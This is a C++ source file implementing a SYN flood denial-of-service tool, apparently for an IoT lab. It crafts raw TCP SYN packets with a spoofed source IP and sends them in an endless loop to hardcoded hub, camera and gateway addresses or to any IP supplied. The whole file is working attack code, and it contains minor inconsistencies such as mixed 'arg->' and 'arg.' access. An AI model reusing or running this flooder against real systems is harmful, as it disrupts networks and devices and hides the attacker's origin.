#include "dos_attack.h"

unsigned short dos_attack::csum (unsigned short *buf, int nwords) // checksum calculation
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

void dos_attack::Fill(ip *ip, tcphdr *tcp, sockaddr_in *addr, int port){ // filling a TCP and IP header for SYN packet
  ip->ip_hl = 5;
  ip->ip_v = 4;
  ip->ip_tos = 0;
  ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
  ip->ip_id = htons(12345); // Random value from free ports
  ip->ip_off = 0;
  ip->ip_ttl = 255;
  ip->ip_p = 6;
  ip->ip_src.s_addr = inet_addr("1.2.3.4"); // spoofed IP address
  ip->ip_dst.s_addr = addr->sin_addr.s_addr;

  tcp->th_sport = htons(1234);
  tcp->th_dport = htons(port);
  tcp->th_seq = 0;
  tcp->th_ack = 0;
  tcp->th_x2 = 0;
  tcp->th_off = 0;
  tcp->th_flags = TH_SYN;
  tcp->th_win = htons(65535);
  tcp->th_sum = 0;
  tcp->th_urp = 0;

  ip->ip_sum = csum ((unsigned short *) ip, ip->ip_len >> 1);

}

void dos_attack::Flood(arg arg){
  int sock;
  char packet[4096];
  struct ip *ip = (struct ip *) packet;
  struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof (struct ip));
  struct sockaddr_in addr;

  addr.sin_family = AF_INET;
  addr.sin_port = htons(arg->port); // aplication port to be attacked

  switch (arg.device) { // Setting IP address of device to to be attacked
    case HUB:
      inet_aton("192.168.1.131",&addr.sin_addr);
      break;
    case CAMERA:
      inet_aton("192.168.1.133",&addr.sin_addr);
      break;
    case GATEWAY:
      inet_aton("192.168.1.134",&addr.sin_addr);
      break;
    default:
      if(inet_pton(AF_INET,arg.ip_address.c_str(),&(addr.sin_addr)) == -1){
        err(UNKNOWN, -1);
      }
      break;
  }

  memset(packet, 0, 4096);

  Fill(ip, tcp, &addr, arg.port);//Fill packet

  sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // socket creation
  err(sock<0 ? SOCKET_ERR : OK, sock);

  int one = 1;
  const int *val = &one;
  if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
    err(SOCKET_ERR, sock);
  }
  while (1){ // unstoppable cycle to generate SYN packets for destination device
  	sendto (sock, packet,	ip->ip_len,	0, (struct sockaddr *) &addr,	sizeof (addr));
  }
}
